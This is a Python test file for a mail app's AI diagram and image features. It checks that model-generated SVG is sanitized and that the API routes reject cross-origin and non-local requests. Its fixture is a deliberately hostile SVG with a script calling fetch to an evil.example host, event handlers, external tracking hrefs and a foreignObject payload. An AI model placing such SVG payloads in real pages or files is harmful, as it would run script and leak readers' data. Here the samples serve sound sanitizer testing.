#!/usr/bin/env python3
"""Offline tests for the compose VISUAL paths:
  * mail_ai.generate_diagram        (free SVG "diagram-as-code", sanitized)
  * mail_ai.generate_visual_image   (thin wrapper over gemini_client.generate_image)
  * the /api/mail/diagram and /api/mail/image routes (loopback + same-origin gate)

Gemini is faked via the same seam server.py uses (mail_ai._gemini); the routes are
driven in-process over loopback with mail_ai.* stubbed, so nothing hits the network
or the free quota. ASCII labels only (safe under a cp1252 console). Run:
python test_mail_visual.py
"""
from __future__ import annotations

import json
import os
import sys
import tempfile
import threading
import urllib.error
import urllib.request
from http.server import ThreadingHTTPServer
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))

_TMP = Path(tempfile.mkdtemp(prefix="mailvisual_"))
os.environ["AGENT_VIEW_MAIL_PROFILES"] = str(_TMP / "mail_profiles")

import mail_ai      # noqa: E402

_results = []


def check(name, cond, detail=""):
    _results.append((name, bool(cond), detail))
    print(("PASS " if cond else "FAIL ") + name + (f"  -- {detail}" if detail and not cond else ""))


# --------------------------------------------------------------------------- #
#  Fake Gemini — .call returns a canned diagram reply; .generate_image returns a
#  canned (mime, base64). Records how it was invoked (json_out, api_key).
# --------------------------------------------------------------------------- #
class FakeGemini:
    def __init__(self, call_reply="", image=("image/png", "aW1n")):
        self.call_reply = call_reply
        self.image = image
        self.calls = []          # (prompt, json_out, api_key)
        self.image_calls = []    # (prompt, api_key)

    def call(self, prompt, *, json_out=True, temperature=0.2, api_key="", files=None):
        self.calls.append((prompt, json_out, api_key))
        return self.call_reply

    def generate_image(self, prompt, *, api_key=""):
        self.image_calls.append((prompt, api_key))
        return self.image


def _install(gem):
    mail_ai._gemini = lambda: gem
    return gem


# A hostile SVG: script + two event handlers + external href/src + <foreignObject>
# + an <image> with an http href, wrapped in surrounding prose. An internal
# #fragment ref and the viewBox must survive.
_DIRTY_SVG_REPLY = (
    "Here is your diagram:\n"
    '<svg viewBox="0 0 200 100" width="200" height="100" onload="steal()">'
    '<script>fetch("http://evil.example/x")</script>'
    '<rect x="1" y="1" onclick="boom()" href="http://evil.example/track.png"/>'
    '<image href="http://evil.example/pixel.png"/>'
    '<foreignObject><body>SECRET_HTML_PAYLOAD</body></foreignObject>'
    '<linearGradient id="g1"/><rect fill="url(#g1)"/>'
    '<a xlink:href="#g1"><text x="10" y="50">Node</text></a>'
    "</svg>\n"
    "That is the diagram.\n")


def test_diagram_sanitizes_but_returns_svg():
    gem = _install(FakeGemini(call_reply=_DIRTY_SVG_REPLY))
    out = mail_ai.generate_diagram("draw a two-node flow", api_key="")
    svg = (out or {}).get("svg", "")

    check("diagram: exactly one Gemini call", len(gem.calls) == 1, str(len(gem.calls)))
    prompt, json_out, api_key = gem.calls[0]
    check("diagram: TEXT-mode call (json_out False)", json_out is False)
    check("diagram: UNPINNED (empty api_key -> rotates)", api_key == "", repr(api_key))
    check("diagram: prompt carries the intent", "two-node flow" in prompt)

    low = svg.lower()
    check("diagram: <script> stripped", "<script" not in low and "fetch(" not in svg)
    check("diagram: onload handler stripped", "onload" not in low)
    check("diagram: onclick handler stripped", "onclick" not in low)
    check("diagram: <foreignObject> stripped", "foreignobject" not in low)
    check("diagram: foreignObject body content gone", "SECRET_HTML_PAYLOAD" not in svg)
    check("diagram: external http refs stripped", "http://evil" not in svg)
    # What must SURVIVE: the root svg, the viewBox, and the internal #fragment ref.
    check("diagram: still an <svg> ... </svg>",
          low.startswith("<svg") and low.rstrip().endswith("</svg>"), svg[:40])
    check("diagram: viewBox preserved", "viewBox=" in svg)
    check("diagram: internal #fragment ref preserved (gradient/marker)", "#g1" in svg)


def test_diagram_extracts_svg_from_surrounding_prose():
    # The reply has leading/trailing prose; only the <svg>...</svg> is returned.
    gem = _install(FakeGemini(call_reply=_DIRTY_SVG_REPLY))
    svg = mail_ai.generate_diagram("x").get("svg", "")
    check("diagram: surrounding prose dropped",
          "Here is your diagram" not in svg and "That is the diagram" not in svg)


def test_diagram_no_svg_raises():
    _install(FakeGemini(call_reply="Sorry, I cannot draw that."))
    try:
        mail_ai.generate_diagram("nope")
        check("diagram(no-svg): raised", False)
    except mail_ai.GeminiError:
        check("diagram(no-svg): raised GeminiError", True)


def test_diagram_caps_intent_length():
    gem = _install(FakeGemini(call_reply="<svg viewBox='0 0 1 1'></svg>"))
    mail_ai.generate_diagram("y" * 5000)
    prompt = gem.calls[0][0] if gem.calls else ""
    check("diagram: intent capped (~4000) before the prompt",
          ("y" * 4001) not in prompt and ("y" * 3999) in prompt)


def test_visual_image_wrapper_shape():
    gem = _install(FakeGemini(image=("image/png", "QUJD")))
    out = mail_ai.generate_visual_image("a red circle", api_key="")
    check("image: one generate_image call", len(gem.image_calls) == 1, str(len(gem.image_calls)))
    check("image: prompt threaded through", gem.image_calls[0][0] == "a red circle")
    check("image: UNPINNED (empty api_key)", gem.image_calls[0][1] == "")
    check("image: returns {mime, data_b64}",
          out == {"mime": "image/png", "data_b64": "QUJD"}, str(out))


def test_visual_image_propagates_gemini_error():
    class NoImage:
        def generate_image(self, prompt, *, api_key=""):
            raise mail_ai.GeminiError("no image in response")
    _install(NoImage())
    try:
        mail_ai.generate_visual_image("x")
        check("image(refusal): raised", False)
    except mail_ai.GeminiError:
        check("image(refusal): GeminiError propagates from the one door", True)


# --------------------------------------------------------------------------- #
#  Routes — loopback happy path + cross-origin CSRF rejection + in the _MUT gate.
# --------------------------------------------------------------------------- #
import server      # noqa: E402


def _start_server():
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), server.Handler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    return httpd, httpd.server_address[1]


def _post(port, route, payload, origin=None):
    headers = {"Content-Type": "application/json"}
    if origin:
        headers["Origin"] = origin
    req = urllib.request.Request(f"http://127.0.0.1:{port}{route}",
                                 data=json.dumps(payload).encode(), method="POST",
                                 headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            return r.status, json.loads(r.read().decode() or "{}")
    except urllib.error.HTTPError as e:
        return e.code, {}


def test_diagram_route_happy_and_csrf():
    calls = []
    orig = mail_ai.generate_diagram
    mail_ai.generate_diagram = (lambda intent, *a, **k:
                                (calls.append(intent) or {"svg": "<svg></svg>"}))
    httpd, port = _start_server()
    try:
        code, out = _post(port, "/api/mail/diagram", {"intent": "flow chart"})
        check("diagram route: loopback POST -> 200", code == 200, str(code))
        check("diagram route: reached generate_diagram with the intent",
              calls == ["flow chart"], str(calls))
        check("diagram route: response carries {svg}", out.get("svg") == "<svg></svg>", str(out))

        code2, _ = _post(port, "/api/mail/diagram", {"intent": "x"},
                         origin="http://evil.example:1234")
        check("diagram route: cross-origin POST -> 403 (CSRF gate)", code2 == 403, str(code2))
        check("diagram route: not reached on cross-origin", len(calls) == 1, str(calls))
    finally:
        httpd.shutdown()
        httpd.server_close()
        mail_ai.generate_diagram = orig


def test_diagram_route_caps_intent():
    seen = []
    orig = mail_ai.generate_diagram
    mail_ai.generate_diagram = lambda intent, *a, **k: (seen.append(intent) or {"svg": "<svg></svg>"})
    httpd, port = _start_server()
    try:
        _post(port, "/api/mail/diagram", {"intent": "z" * 9000})
        check("diagram route: intent capped at ~4000 before mail_ai",
              seen and len(seen[0]) == 4000, str(len(seen[0]) if seen else -1))
    finally:
        httpd.shutdown()
        httpd.server_close()
        mail_ai.generate_diagram = orig


def test_image_route_happy_and_csrf():
    calls = []
    orig = mail_ai.generate_visual_image
    mail_ai.generate_visual_image = (lambda prompt, *a, **k:
                                     (calls.append(prompt)
                                      or {"mime": "image/png", "data_b64": "QUJD"}))
    httpd, port = _start_server()
    try:
        code, out = _post(port, "/api/mail/image", {"prompt": "a logo"})
        check("image route: loopback POST -> 200", code == 200, str(code))
        check("image route: reached generate_visual_image with the prompt",
              calls == ["a logo"], str(calls))
        check("image route: response carries {mime, data_b64}",
              out == {"mime": "image/png", "data_b64": "QUJD"}, str(out))

        code2, _ = _post(port, "/api/mail/image", {"prompt": "x"},
                         origin="http://evil.example:1234")
        check("image route: cross-origin POST -> 403 (CSRF gate)", code2 == 403, str(code2))
        check("image route: not reached on cross-origin", len(calls) == 1, str(calls))
    finally:
        httpd.shutdown()
        httpd.server_close()
        mail_ai.generate_visual_image = orig


def test_routes_in_mutation_gate():
    import inspect
    src = inspect.getsource(server.Handler.do_POST)
    check("gate: /api/mail/diagram is in the mutation tuple _MUT",
          '"/api/mail/diagram"' in src)
    check("gate: /api/mail/image is in the mutation tuple _MUT",
          '"/api/mail/image"' in src)


def test_routes_reject_non_loopback_peer():
    # The mutation gate depends on _client_is_local; a LAN peer must read as remote
    # for BOTH new routes (they SPEND the shared free quota).
    h = server.Handler.__new__(server.Handler)
    h.client_address = ("192.168.1.50", 5555)
    check("gate: LAN peer is NOT local", server.Handler._client_is_local(h) is False)


def main():
    for fn in (test_diagram_sanitizes_but_returns_svg,
               test_diagram_extracts_svg_from_surrounding_prose,
               test_diagram_no_svg_raises, test_diagram_caps_intent_length,
               test_visual_image_wrapper_shape,
               test_visual_image_propagates_gemini_error,
               test_diagram_route_happy_and_csrf, test_diagram_route_caps_intent,
               test_image_route_happy_and_csrf, test_routes_in_mutation_gate,
               test_routes_reject_non_loopback_peer):
        try:
            fn()
        except Exception as exc:
            check(fn.__name__ + " (raised)", False, f"{type(exc).__name__}: {exc}")
    passed = sum(1 for _n, ok, _d in _results if ok)
    total = len(_results)
    print(f"\n{passed}/{total} checks passed")
    return 0 if passed == total else 1


if __name__ == "__main__":
    raise SystemExit(main())
